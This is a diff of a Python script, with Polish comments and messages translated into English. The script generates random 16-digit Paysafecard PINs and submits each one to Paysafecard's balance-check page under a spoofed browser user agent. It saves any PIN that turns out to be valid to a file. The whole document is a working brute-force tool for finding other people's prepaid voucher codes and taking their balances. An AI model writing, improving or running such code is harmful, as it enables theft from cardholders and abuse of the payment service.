@@ -4,26 +4,26 @@ import random
 import string
 
 def sprawdz_kod_psc(kod):
-    # Ustawienie user agenta
+    # Set user agent
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
     }
     
-    # Adres URL do sprawdzania kodu PSC
+    # URL for checking PSC code
     url = "https://www.paysafecard.com/pl/sprawdzanie-dostepnych-srodkow/"
     
-    # Przygotowanie danych do wysłania
+    # Prepare data to send
     data = {
         'pin': kod,
-        'submit': 'Sprawdź saldo'
+        'submit': 'Check balance'
     }
     
-    # Wykonanie żądania POST
+    # Execute POST request
     response = requests.post(url, headers=headers, data=data)
     
-    # Sprawdzenie statusu odpowiedzi
+    # Check response status
     if response.status_code == 200:
-        # Przetwarzanie odpowiedzi
+        # Process response
         soup = BeautifulSoup(response.text, 'html.parser')
         result = soup.find('div', {'class': 'c-form-checker__result'})
         
@@ -38,8 +38,8 @@ def sprawdz_kod_psc(kod):
         return False
 
 def generuj_kod():
-    kod = '0'  # Początkowa cyfra to 0
-    kod += ''.join(random.choices(string.digits, k=15))  # Pozostałe 15 cyfr losowo wybierane
+    kod = '0'  # Initial digit is 0
+    kod += ''.join(random.choices(string.digits, k=15))  # Next 15 digits are randomly chosen
     return kod
 
 def zapisz_do_pliku(kody):
@@ -47,27 +47,28 @@ def zapisz_do_pliku(kody):
         for kod in kody:
             file.write(kod + '\n')
 
-# Główny program
+# Main program
 def main():
-    ilosc_kodow = int(input("Ile kodów chcesz sprawdzić: "))
+    ilosc_kodow = int(input("How many codes do you want to check: "))
     znalezione_kody = []
     licznik_prawidlowych_kodow = 0
     
     while len(znalezione_kody) < ilosc_kodow:
         kod_psc = generuj_kod()
-        print("Sprawdzam kod:", kod_psc)
+        print("Checking code:", kod_psc)
         if sprawdz_kod_psc(kod_psc):
-            print("Znaleziono prawidłowy kod:", kod_psc)
+            print("Valid code found:", kod_psc)
             znalezione_kody.append(kod_psc)
             licznik_prawidlowych_kodow += 1
         else:
-            print("Kod jest nieprawidłowy.")
+            print("The code is invalid.")
     
-    print("Liczba znalezionych prawidłowych kodów:", licznik_prawidlowych_kodow)
+    print("Number of valid codes found:", licznik_prawidlowych_kodow)
     
     if znalezione_kody:
         zapisz_do_pliku(znalezione_kody)
-        print("Prawidłowe kody zostały zapisane do pliku 'workingcodes.txt'.")
+        print("Valid codes have been saved to the file 'workingcodes.txt'.")
 
 if __name__ == "__main__":
     main()
+    
